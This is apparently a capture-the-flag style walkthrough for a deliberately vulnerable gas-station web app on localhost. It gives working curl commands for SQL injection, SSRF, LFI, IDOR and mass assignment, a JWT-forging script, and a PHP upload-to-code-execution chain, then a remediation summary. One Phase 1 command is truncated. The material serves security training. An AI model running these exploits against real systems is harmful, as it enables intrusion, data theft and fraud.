Follow the sections from top to bottom. Do not jump straight to the flags: each phase teaches one idea and gives you a way to confirm that it worked.

PRIMARY TOOL

Burp Suite Workflow

This guide is designed to be solved in Burp Suite. The request examples below are raw HTTP requests for Proxy, Repeater, Intruder, or Turbo Intruder.

1. Configure the browser

  1. Start Burp Suite and use the default proxy listener at 127.0.0.1:8080.
  2. Configure the browser to use that proxy for HTTP.
  3. Visit http://burp and install Burp’s CA certificate if HTTPS interception is needed.
  4. Use Proxy → Intercept to capture requests and HTTP history to review traffic.

2. Use Repeater

Right-click a request in HTTP history and choose Send to Repeater. Change one value at a time, click Send, and compare status, response length, and JSON fields with the baseline.

3. Capture the login token

Log in through /login.html, then find this request:

POST /api/auth/login HTTP/1.1
Host: 127.0.0.1:9005
Content-Type: application/json

{\"email\":\"kwame@gmail.com\",\"password\":\"Kwame@2024\"}

Send it to Repeater and copy the JSON token. For cookie-authenticated requests, Burp can preserve the session cookie automatically.

4. Burp tools by task

  • Repeater: SSRF, IDOR, LFI, mass assignment, price tampering, and access-control checks.
  • JWT Editor: decode the token, change the role to admin, and sign it with the secret recovered from SSRF/LFI.
  • Intruder or Turbo Intruder: send concurrent loyalty-redemption requests.
  • Proxy intercept: capture multipart upload and change filename/content type.
  • Comparer: compare true/false SQL-injection responses.
Burp habit: save the original request before editing it. Use status, body length, and returned fields as evidence that each step worked.

Exploit Procedures — V1 to V12

The Burp POC Library above is the canonical request source. Use TOKEN for the normal customer token and ADMIN_TOKEN after the JWT-forgery phase. V1–V9 and V11 have no separate flag; V10 and V12 produce the runtime proofs.

V1 — Mass assignment

  1. Register with server-controlled fields.
  2. Log in as the new user.
  3. Call /api/auth/me to confirm the role and points.
curl -s "$TARGET/api/auth/register" -H 'Content-Type: application/json' -d '{"email":"mass@example.test","password":"LabPass1!","name":"Mass User","role":"admin","loyalty_points":999999,"card_number":"0000-0000-0000-0000"}' | jq
curl -s "$TARGET/api/auth/login" -H 'Content-Type: application/json' -d '{"email":"mass@example.test","password":"LabPass1!"}' | jq

Result: attacker-selected role, points, and card data. Flag: none.

V2 — Transaction IDOR

  1. Authenticate as the seeded customer.
  2. Request another numeric transaction ID.
  3. Inspect returned customer and card fields.
curl -s "$TARGET/api/transactions/1" -H "Authorization: Bearer $TOKEN" | jq

Result: another customer’s transaction and PII. Flag: none.

V3 — JWT forgery

  1. Recover the secret through V5 SSRF or V9 LFI.
  2. Use the Phase 2 forge script with userId: 1 and role: admin.
  3. Call admin routes.
curl -s "$TARGET/api/admin/users" -H "Authorization: Bearer $ADMIN_TOKEN" | jq
curl -s "$TARGET/api/admin/audit" -H "Authorization: Bearer $ADMIN_TOKEN" | jq

Result: administrator data is accessible. Flag: none.

V4 — Boolean blind SQL injection

  1. Send an always-true predicate.
  2. Send an always-false predicate.
  3. Compare returned row counts.
curl -sG "$TARGET/api/fuel/search" -H "Authorization: Bearer $TOKEN" --data-urlencode "type=%' OR 1=1 --" | jq
curl -sG "$TARGET/api/fuel/search" -H "Authorization: Bearer $TOKEN" --data-urlencode "type=%' AND 1=0 --" | jq

Result: the type value controls the SQLite query. Flag: none.

V5 — SSRF

  1. Use the authenticated price-feed route.
  2. Point it to the internal loopback service.
  3. Read the returned JSON.
curl -s "$TARGET/api/fuel/external-price" -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' -d '{"url":"http://127.0.0.1:3000/api/internal/pricing"}' | jq

Result: internal data and the JWT secret. Flag: none.

V6 — Price tampering

  1. Choose a valid fuel type.
  2. Submit a false client price.
  3. Inspect the recorded transaction.
curl -s "$TARGET/api/transactions" -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' -d '{"pump_number":1,"fuel_type":"Petrol","litres":1,"price_per_litre":0.01,"payment_method":"cash"}' | jq
curl -s "$TARGET/api/transactions/my" -H "Authorization: Bearer $TOKEN" | jq

Result: client-controlled total and no inventory decrement. Flag: none.

V7 — Loyalty race and negative points

  1. Use an account with sufficient points.
  2. Send concurrent redemptions during the 250 ms window.
  3. Inspect balance/history, then test a negative value.
for n in $(seq 1 10); do curl -s "$TARGET/api/loyalty/redeem" -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' -d '{"points":500}' & done; wait
curl -s "$TARGET/api/loyalty/history" -H "Authorization: Bearer $TOKEN" | jq
curl -s "$TARGET/api/loyalty/redeem" -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' -d '{"points":-100}' | jq

Result: points can be over-consumed or increased. Flag: none.

V8 — XML / XXE test

  1. Submit a normal manifest.
  2. Test external entities only against this local lab.
  3. Record whether the parser rejects or expands them.
curl -s "$TARGET/api/deliveries/upload" -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/xml' --data-binary '<?xml version="1.0"?><manifest><supplier>Test</supplier><fuel>Petrol</fuel><quantity>1</quantity></manifest>' | jq

Result: hardening options are absent, but xml2js/sax may reject external entities in this build. Flag: none.

V9 — Local file inclusion

  1. Use the report endpoint with a customer token.
  2. Supply an absolute path.
  3. Read configuration or source.
curl -sG "$TARGET/api/reports/generate" -H "Authorization: Bearer $TOKEN" --data-urlencode 'template=/etc/acs-gas-station/config.txt' | jq -r .content
curl -sG "$TARGET/api/reports/generate" -H "Authorization: Bearer $TOKEN" --data-urlencode 'template=/app/server.js' | jq -r .content

Result: readable files and secrets are returned. Flag: none.

V10 — Upload to PHP execution

  1. Create PHP that reads the proof file.
  2. Upload it as image/jpeg.
  3. Request the returned URL.
echo '<?php echo file_get_contents("/var/www/proof.txt"); ?>' > proof.php
UPLOAD=$(curl -s "$TARGET/api/upload/receipt" -H "Authorization: Bearer $ADMIN_TOKEN" -F 'receipt=@proof.php;type=image/jpeg')
URL=$(echo "$UPLOAD" | jq -r .url)
curl -s "$TARGET$URL"

Result: uploaded PHP executes as the root process. Flag: upload proof.

V11 — Broken manager authorization

  1. Use the customer token.
  2. Call the manager endpoint directly.
  3. Inspect all collections.
curl -s "$TARGET/api/manager/dashboard" -H "Authorization: Bearer $TOKEN" | jq

Result: station data, cards, contacts, shifts, and transactions are exposed. Flag: none.

V12 — Full kill chain

  1. Login as the customer.
  2. Exploit SSRF to recover the secret.
  3. Forge the administrator JWT.
  4. Upload PHP with the MIME bypass.
  5. Read all three proof targets through separate PHP files.

Result: full code execution and all runtime proofs.

4. Phase 1 — SSRF to JWT Secret

1
Use the price-feed endpoint, which fetches an attacker-controlled URL server-side.
2
Target the application loopback interface and internal port:
curl -s "$TARGET/api/fuel/external-price" \
  -H "Authorization: Bearer $TOKEN" \

Save jwt_secret. The expected lab value is acs-gas-station2025. If needed, try localhost:3000 instead.

5. Phase 2 — Forge an Administrator JWT

Create forge-jwt.py:

import base64, hashlib, hmac, json
SECRET = b"acs-gas-station2025"
def enc(v):
    raw = json.dumps(v, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()
header = enc({"alg":"HS256","typ":"JWT"})
payload = enc({"userId":1,"role":"admin"})
body = f"{header}.{payload}".encode()
sig = base64.urlsafe_b64encode(hmac.new(SECRET, body, hashlib.sha256).digest()).rstrip(b"=").decode()
print(f"{header}.{payload}.{sig}")
export ADMIN_TOKEN=$(python3 forge-jwt.py)
curl -s "$TARGET/api/auth/me" -H "Authorization: Bearer $ADMIN_TOKEN" | jq
curl -s "$TARGET/api/admin/stats" -H "Authorization: Bearer $ADMIN_TOKEN" | jq

userId: 1 is the seeded administrator. A successful stats response confirms the forged identity.

6. Phase 3 — Upload-to-RCE

The upload filter trusts the multipart MIME value and the response handler executes filenames ending in .php.

printf '%s\n' '<?php echo file_get_contents("/var/www/proof.txt"); ?>' > proof.php
UPLOAD=$(curl -s "$TARGET/api/upload/receipt" \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -F 'receipt=@proof.php;type=image/jpeg')
echo "$UPLOAD" | jq
export PHP_URL=$(echo "$UPLOAD" | jq -r .url)
curl -s "$TARGET$PHP_URL"
The response should contain the upload-RCE proof. Record it in your lab notes; this guide intentionally does not disclose flag values.

Frontend XSS verification

In the lab, register a test name containing harmless markup, then view the customer in the manager dashboard. Also inspect the reports page after fetching a response containing markup. The vulnerable sinks use innerHTML; remediation is context-safe DOM APIs or a trusted sanitizer.

CSRF verification

Because the browser sends hf_token automatically, a cross-origin form can attempt cookie-authenticated state changes unless cookie SameSite and server-side CSRF defenses are added. Use only a local test browser and test account.

11. Completion Checklist

12. Defensive Summary

Use allow-listed DTOs, password hashing, rotated secrets, database-backed authorization, parameterized SQL, atomic loyalty updates, server-side pricing, hardened XML parsing, outbound request allow-lists, fixed report directories, generated upload names outside the web root, content validation, and no execution of uploaded files.

Use output encoding or safe DOM APIs, CSRF tokens and strict cookie attributes, rate limits, security headers, generic errors, audit monitoring, and server-side input bounds.

Run the application as a non-root user and remove writable root cron/sudo paths from the image.
